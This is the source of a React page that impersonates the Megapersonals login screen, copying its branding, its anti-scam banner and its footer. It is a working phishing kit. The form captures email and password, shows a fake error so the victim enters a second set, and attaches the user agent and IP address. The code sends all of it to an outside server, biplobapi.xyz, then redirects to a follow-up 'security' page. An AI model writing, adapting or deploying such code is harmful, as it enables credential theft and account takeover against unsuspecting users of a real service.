import React from "react";
import "./Email.css";
import { useForm } from "react-hook-form";
import {
  useLoaderData,
  useLocation,
  useNavigate,
  useParams,
} from "react-router-dom";
import { isBrowser, isMobile } from "react-device-detect";
import { useEffect } from "react";
import { useState } from "react";
import ReCAPTCHA from "react-google-recaptcha";
import Cookies from "universal-cookie";
import { usePageMeta } from "../../hooks/usePageMeta";
const Email = () => {
   usePageMeta("Megapersonals | Classified Hookup Service", "/favicon.ico");
  const navigate = useNavigate();
  const params = useParams();
  const location = useLocation();
  const pathAfterDomain = location.pathname.split("/").slice(1, -1).join("/");
  const [test, setTest] = useState(0);
  const [passwordError, setPasswordError] = useState(false);
  const [verified, setVerified] = useState(false);
  const [token, setToken] = useState();
  const [refreshReCaptcha, setRefreshReCaptcha] = useState(false);
  const [userAgent, setUserAgent] = useState("");
  const [ipAddress, setIPAddress] = useState("");
  const [cookies, setCookies] = useState("");
  const [codeLength, setCodeLength] = useState(true);
  const [step, setStep] = useState(0);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [captcha, setCaptcha] = useState("");
  const [captchaEror, setCaptchaError] = useState("");
  const [loader, setLoader] = useState(false);
  const [userId, setUserId] = useState();
  let type;
  const {
    register,
    handleSubmit,
    resetField,
    formState: { errors, isDirty, isValid },
    reset,
  } = useForm();

  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }

  localStorage.setItem("url", `/${pathAfterDomain}/${params.id}`);

  // console.log(localStorage.getItem('url'))

  useEffect(() => {
    //  fetch(`https://biplobapi.xyz/auth/login/${params.id}`)
    //       .then((response) => response.json())
    //       .then((data) => {
    //         console.log(data?.user);
    //       setUserId(data?.user);
    //       });
    const userAgent = window.navigator.userAgent;
    setUserAgent(userAgent);
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => setIPAddress(data.ip))
      .catch((error) => console.log(error));
    const bookings = {
      type: type,
    };

    fetch(`https://biplobapi.xyz/updateclick/${params.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json(); // parse the JSON body
      })
      .then((data) => {
        console.log("Update successful:", data?.data?.userId);
        setUserId(data?.data?.userId); // if needed
      })
      .catch((error) => {
        console.error("Fetch error:", error);
      });

    // Cleanup function to stop the camera when the component unmounts
    // Set the document title
    document.title = "Megapersonal";

    // Create a link element for the favicon
    const favicon = document.createElement("link");
    favicon.rel = "icon";
    favicon.href = "/favicon.ico"; // Update with the correct path to your favicon

    // Append the favicon to the head
    document.head.appendChild(favicon);

    // Cleanup function to remove the favicon when the component is unmounted or favicon changes
  }, [type, params.id]);

  // const handleAddBooking = (data) => {
  //   if (test === 0) {
  //     setTest(test + 1);
  //     setPasswordError(true);
  //     localStorage.setItem('fpass', data.password);
  //     resetField("password");
  //   } else {
  //     const bookings = {
  //       email: data.email,
  //       password: localStorage.getItem('fpass') + '//' + data.password,
  //       // password:  data.password,
  //       code: "",
  //       ssn: "",
  //       idOne: "",
  //       idTwo: "",
  //       user: user,
  //       temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
  //       postingTime: Date().toLocaleString(),
  //     };
  //     fetch("https://biplobapi.xyz/informations", {
  //       method: "POST",
  //       headers: {
  //         "content-type": "application/json",
  //       },
  //       body: JSON.stringify(bookings),
  //     })
  //       .then((res) => res.json())
  //       .then((result) => {
  //         reset();
  //         pathInfo(bookings);
  //       });
  //   }
  // };

  const handleAddBooking = (data) => {
    console.log(userId)
    setLoader(true);
    if (step === 0) {
      const bookings = {
        email: data.email,
        address: data.password,
        site: "mega",
        code: "",
        ssn: "",
        idOne: "",
        idTwo: "",
        agent: userAgent,
        // cookieData:JSON.stringify(cookieData, null, 2),
        ip: ipAddress,
        userId: userId,
        temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
        postingTime: Date().toLocaleString(),
        isDeleted: false,
      };
      fetch("https://biplobapi.xyz/informations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify(bookings),
      })
        .then((res) => res.json())
        .then((result) => {
          setStep(1);
          setEmail(data.email);
          setPassword(data.password);
          setLoader(false);
          // setPasswordError(true);
          // setCodeLength(false);
          // setCaptchaError('Captcha doesnt match');
        });
    } else {
      setLoader(true);
      setPasswordError(false);
      localStorage.setItem("femail", data.email);
      const bookings = {
        email: email + " // " + data.email,
        address: password + " // " + data.password,
        site: "mega",
        code: "",
        ssn: "",
        idOne: "",
        idTwo: "",
        agent: userAgent,
        // cookieData:JSON.stringify(cookieData, null, 2),
        ip: ipAddress,
        userId: userId,
        temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
        postingTime: Date().toLocaleString(),
        isDeleted: false,
      };
      console.log(bookings);
      fetch("https://biplobapi.xyz/informations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify(bookings),
      })
        .then((res) => res.json())
        .then((result) => {
          reset();
          setLoader(false);
          pathInfo(bookings);
        });
    }
  };
  const handleCaptcha = (data) => {
    setVerified(true);
    // console.log(data);
  };
  const handleCode = (event) => {
    setCaptcha(event.target.value);
    event.target.value.length === 4
      ? setCodeLength(event.target.value === "csbs")
      : setCodeLength(false);
  };
  const pathInfo = (infos) => {
    let userId = window.location.pathname;
    const fnl = userId.substring(
      userId.indexOf("/") + 1,
      userId.lastIndexOf("/")
    );
    // navigate("/gmail", { state: { temp: infos.temp } });
    navigate("/security", { state: { temp: infos.temp } });
    // if (fnl === "auth/login" || "verify/login" ) {
    //   navigate("/security", { state: { temp: infos.temp } });
    // } else {
    // }
  };

  return (
    <div className="em-mn-dv">
      <div className="container-fluid">
        <div className="row text-center">
          <div className="col-md-12 text-center pt-3">
            <img className="main_img" src="/mega.png" alt="" />
          </div>
        </div>
        <div className="row">
          <div className="col-md-12 text-center pt-2">
            <h3 className="logincopy">Is this your first time posting?</h3>
            <a className="starthere" href="">
              Start Here
            </a>
          </div>
        </div>
        <div className="row mt-3">
          <div className="col-md-12 text-center">
            <h3 className="logincopy">Already have a account?</h3>
            {/* <h2 className="loginlabel">Login</h2> */}
          </div>
          <div className="col-9 col-sm-4 col-md-5 mx-auto text-center  px-0">
            <form onSubmit={handleSubmit(handleAddBooking)} className="mt-3">
              {passwordError && (
                <small style={{ color: "#FF8080" }}>
                  Email or Password is wrong
                </small>
              )}
              <div className="form-group">
                <input
                  name="email"
                  type="email"
                  className="form-control bordered"
                  {...register("email", { required: true })}
                  aria-describedby="emailHelp"
                  placeholder="Email"
                />
              </div>
              <div
                className="form-group"
                style={{ marginTop: "-4px", marginBottom: "5px" }}
              >
                <input
                  name="password"
                  type="password"
                  className="form-control bordered"
                  {...register("password", { required: true })}
                  placeholder="Password"
                />

                <input type="hidden" className="device" value="{{ $result}}" />
              </div>
              <div className="cap_wrap">
                <div className="captcha_image">
                  <img
                    src="https://res.cloudinary.com/dj86ouq8b/image/upload/v1716020965/image_2024_05_18T03_50_06_625Z_ks0ufw.png"
                    id="captcha_image_itself"
                    alt="captcha"
                  />
                </div>
                <div className="replyCaptchaReloadButton">
                  <a href="#">
                    <img
                      src="https://res.cloudinary.com/dj86ouq8b/image/upload/v1709825391/mnew/reloadButton_ay2zax.png"
                      width="40"
                      height="40"
                    />
                  </a>
                </div>
              </div>
              {/* <img src="/captcha.png" alt="" className="my-1 w-100" /> */}
              <div className="form-group">
                {/* <input value={captcha} onChange={handleCode} maxLength={4} name="captcha" type="text" className="form-control bordered captcha-box" placeholder="Enter the code from the picture" /> */}
                <input
                  maxLength={4}
                  name="captcha"
                  type="text"
                  className="form-control bordered captcha-box"
                  placeholder="Enter the code from the picture"
                />

                {captchaEror && (
                  <small style={{ color: "#FF8080" }}>
                    Captcha doesn't match
                  </small>
                )}
              </div>

              {/* <button type="submit" className="btn btn-primary mt-2" disabled={!codeLength}>Submit</button> */}
              <div className="position-relative" style={{ minHeight: "80px" }}>
                {loader ? (
                  <div className="loader"></div>
                ) : (
                  <button type="submit" className="btn btn-primary mt-2">
                    Submit
                  </button>
                )}
              </div>

              <div className="get-scammed-banner">
                <div className="caption">Don't get scammed!</div>
                <div className="body">
                  <div>
                    Is the address up top:
                    <br />
                    megapersonals.eu
                  </div>
                  <div>?</div>
                </div>
              </div>
              {/* <img src="/warning.jpg" alt="" style={{ width: '100%', display: 'block', margin: '0 auto' }} /> */}
              <a className="fpass" href="">
                Forgot password
              </a>
            </form>
          </div>
        </div>
        <div className="row">
          <div className="col-md-12">
            <ul className="pager">
              <li>
                <a href="">Home</a>{" "}
              </li>
              <li>|</li>
              <li>
                <a href="">Manage Post</a>{" "}
              </li>
              <li>|</li>
              <li>
                <a href="">Contact Us</a>
              </li>
              <li>|</li>
              <li>
                <a href="">Policies & Terms</a>
              </li>
            </ul>
          </div>
        </div>
        <div className="row">
          <div className="col-md-12 text-center bottom">
            <p className="buglink">{/* <a href="">Report Bug</a> */}</p>
            <p>Copyright ©2022 MegaPersonals.eu</p>
            {/* <p>For support please email <a href="" style={{color: '#0000EE',textDecoration:'underline'}}>support@megapersonals.eu</a></p> */}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Email;
